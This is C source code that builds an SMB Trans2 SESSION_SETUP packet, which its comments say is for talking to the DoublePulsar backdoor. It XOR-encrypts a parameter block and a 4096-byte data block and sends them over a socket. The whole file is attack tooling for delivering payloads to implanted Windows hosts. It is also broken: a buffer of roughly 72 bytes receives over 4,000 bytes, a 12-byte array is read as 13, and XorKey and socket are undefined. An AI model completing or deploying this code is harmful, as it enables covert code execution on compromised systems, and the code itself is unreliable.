#pragma pack(1)

typedef struct _netbios_header {

  unsigned char type;
  unsigned char flags;

  unsigned short length;

} NETBIOS_HEADER;

typedef struct _smb_header {

  unsigned char protocol[4];
  unsigned char command;

  unsigned short status;
  unsigned char reserved;

  unsigned char  flags;
  unsigned short flags2;

  unsigned char  pad[12];

  unsigned short tid;
  unsigned short pid;
  unsigned short uid;
  unsigned short mid;

} SMB_HEADER;

void main()
{
  
  //might need to fix this value for a doublepulsar trans2 packet
  //we need a packet that contains the 13 parameters + 4096 chunk size + size of NETBIOS_HEADER & SMB_HEADER
  unsigned char packet[sizeof(NETBIOS_HEADER) + 34 + 34];
  
  NETBIOS_HEADER *netbiosHeader = (NETBIOS_HEADER *)packet;
  SMB_HEADER *smbHeader = (SMB_HEADER *)((unsigned char *)packet + sizeof(NETBIOS_HEADER));
  unsigned short *byteCount = (unsigned short *)((unsigned char *)packet + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + 1);
  unsigned char *payload = packet + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER);

  memset(packet, 0, sizeof(packet));

  memcpy(smbHeader->protocol,"\xFFSMB", 4);
  
  netbiosHeader->type   = 0x00;  
  netbiosHeader->length = htons(72);      //  netbiosHeader->length = htons(sizeof(packet) - 4);
  
  smbHeader->command  = 0x32;     /* Transaction2 Request */
  smbHeader->flags    = 0x18;     /* Canonicalized pathnames, case sensitivity */
  smbHeader->flags2   = 0xc007;  /* unicode strings; might need to htons this? */
  smbHeader->pid      = getpid() & 0xFFFF;  //replace this value with 0x0008 or whatever is default
  smbHeader->mid      = 0x42;    //0x42 for multiplex ID

  *payload++                   = 0x0f;     /* wc 15     */
  *((unsigned short *)payload) = htons(0x000c);    /* Total param count 12 */
  payload += 2;
  *((unsigned short *)payload) = htons(0x1000);    /* Total data count of 4096 */
  payload += 2;
  *((unsigned short *)payload) = 1;               /* max parameter count */
  payload += 2;
  *((unsigned short *)payload) = htons(0x0000);    /* Max Data Count */
  payload += 2;
  *((unsigned short *)payload) = htons(0x0000);    /* Max Setup Count */
  payload += 2;
   *((unsigned short *)payload) = htons(0x0000);    /* Reserved = 00*/
  payload += 2;
  *((unsigned short *)payload) = htons(0x0000);    /* Flags = 0x0000*/
  payload += 2;
  *((unsigned short *)payload) = htons(0x001a8925);    /*Timeout = 0x25891a00*/
  payload += 2;
  *((unsigned short *)payload) = htons(0x0000);    /* Reserved = 0x0000*/
  payload += 2;
  *((unsigned short *)payload) = htons(0x000c);    /* param count = 12 */
  payload += 2;
   *((unsigned short *)payload) = htons(0x0042);    /* param count offset = 66 */
  payload += 2;
   *((unsigned short *)payload) = htons(0x1000);    /* Data count of 4096 */
   payload += 2;
  *((unsigned short *)payload) = htons(0x004e);     /* Data offset of 78 */
  payload += 2;
  *((unsigned short *)payload) = 1;                 /* Setup Count of 1 */
  payload += 2;
  *((unsigned short *)payload) = 0;                 /* Reserved of 00 */
  payload += 2;
  *((unsigned short *)payload) = htons(0x000e);     /* Subcommand = SESSION_SETUP = 0x000e */
   payload += 2;
  *((unsigned short *)payload) = htons(0x100d);    /* byte count of 4109 */
  payload += 2;
  *((unsigned short *)payload) = htons(0x00);    /* Padding of 00 */
   payload += 2;
 
   char XOR_PARAMETERS[12];
   //Xor encrypt the parameters here
   XorEncrypt(XorKey, XOR_PARAMETERS, 12);

   //Add Parameters here
    memcpy(payload, XOR_PARAMETERS, 13);
    payload += 13;  

  
    char XOR_DATA[4096];
   //Xor encrypt the SMB data here
   XorEncrypt(XorKey, XOR_DATA, 4096);

   //Add SMB Data
   memcpy(payload, XOR_DATA, 4096);
   payload += 4096;  
  
  send(socket, packet, sizeof(packet)-1, 0);
}
